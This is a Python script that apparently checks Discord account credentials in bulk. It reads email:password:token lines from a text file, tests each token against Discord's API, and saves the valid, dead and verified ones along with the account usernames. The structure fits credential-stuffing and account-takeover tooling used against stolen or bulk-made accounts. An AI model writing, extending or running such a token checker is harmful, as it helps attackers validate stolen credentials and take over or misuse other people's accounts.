import requests, os, sys
from datetime import datetime
from colorama import Fore,  Style

def currentTime(date): 
    return date.strftime("%d/%m/%Y %H:%M:%S")

def redTime(date):
    return f"{Fore.RED}[{currentTime(date)}]{Style.RESET_ALL}"

def greenTime(date):
    return f"{Fore.GREEN}[{currentTime(date)}]{Style.RESET_ALL}"

def yellowTime(date):
    return f"{Fore.YELLOW}[{currentTime(date)}]{Style.RESET_ALL}"

def clearConsole():
    if sys.platform.startswith('win'):
        os.system('cls')
    else:
        os.system('clear')

clearConsole()

def loadTokens():
    if not os.path.exists('tokens.txt'):
        print(f"{redTime(datetime.now())} File 'tokens.txt' not found, please create file called 'tokens.txt' and put your tokens into.")
        os._exit(0)

    with open('tokens.txt', 'r') as f:
        content = f.read()
    return content

tokens = loadTokens()

def checkToken(token):
    valid_tokens = ''
    dead_tokens = ''
    verified_tokens = ''
    totalValid = 0
    totalDead = 0
    totalVerified = 0

    for token in tokens.splitlines():
        email, password, token = token.split(':')
        headers = {
            'Accept': '*/*',
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        json = r.json()

        if r.status_code in(200, 201, 204): 
            if json['verified'] == True:
                verified_tokens += f"{email}:{password}:{token}\n"
                valid_tokens += f"{email}:{password}:{token}\n"
                totalValid += 1
                totalVerified += 1
                print(f"{greenTime(datetime.now())} {token} [Verified]")
            else:
                print(f"{greenTime(datetime.now())} {token}")
                valid_tokens += f"{email}:{password}:{token}\n"
                totalValid += 1
        else:
            print(f"{redTime(datetime.now())} {token}")
            dead_tokens += f"{email}:{password}:{token}\n"
            totalDead += 1

    if totalVerified > 0:
        print(f"{greenTime(datetime.now())} Total '{totalValid}' valid tokens ('{totalVerified}' verified) and '{totalDead}' dead tokens.")
    else:
        print(f"{greenTime(datetime.now())} Total '{totalValid}' valid tokens and '{totalDead}' dead tokens.")

    checkSave = input(f"{yellowTime(datetime.now())} Do you want to save the valid and dead tokens? (y/n): ")

    if checkSave.lower() == 'y':
        with open('valid_tokens.txt', 'w') as f:
            f.write(valid_tokens)

        with open('dead_tokens.txt', 'w') as f:
            f.write(dead_tokens)

        if totalVerified > 0:
            with open('verified_tokens.txt', 'w') as f:
                f.write(verified_tokens)
    elif checkSave.lower() == 'n':
        os._exit(0)
    else:
        os._exit(0)
    getUsernames(valid_tokens)

def getUsernames(valid_tokens):
    usernames = ''
    for token in valid_tokens.splitlines():
        email, password, token = token.split(':')
        headers = {
            'Accept': '*/*',
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        json = r.json()

        if r.status_code in(200, 201, 204):
            usernames += json['username'] + '\n'
    
    with open('usernames.txt', 'w') as f:
        f.write(usernames)
        
checkToken(tokens)